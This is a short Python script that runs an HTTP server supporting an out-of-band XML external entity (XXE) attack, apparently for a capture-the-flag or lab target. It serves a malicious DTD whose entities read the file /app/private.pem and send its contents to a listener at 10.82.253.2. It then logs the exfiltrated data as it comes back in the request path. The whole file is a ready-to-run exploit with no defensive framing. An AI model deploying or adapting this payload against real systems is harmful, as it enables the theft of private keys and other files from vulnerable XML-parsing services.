from http.server import HTTPServer, BaseHTTPRequestHandler
import sys
import os


class SimpleHTTPRequestHandler(BaseHTTPRequestHandler): 
    def do_GET(self):
        self.send_response(200)
        self.end_headers()

        global count
        global port
        
        if count % 2 == 0:
            answer = f'<!ENTITY % payl SYSTEM "file:///app/private.pem">' + \
                     '<!ENTITY % int "<!ENTITY send SYSTEM \'' + \
                     f'http://10.82.253.2:{port}?p=%payl;\'>">'
        else:
            secret_data = self.path
            answer = f"nikakoi_ne_secretik_with_len={len(secret_data)}_" + secret_data[0:50]

        print(self.path)
        print("My answer:")
        print(answer)
        
        self.wfile.write(answer.encode('utf8'))
        count += 1
        

count = 0
port = 20000

httpd = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
httpd.serve_forever()
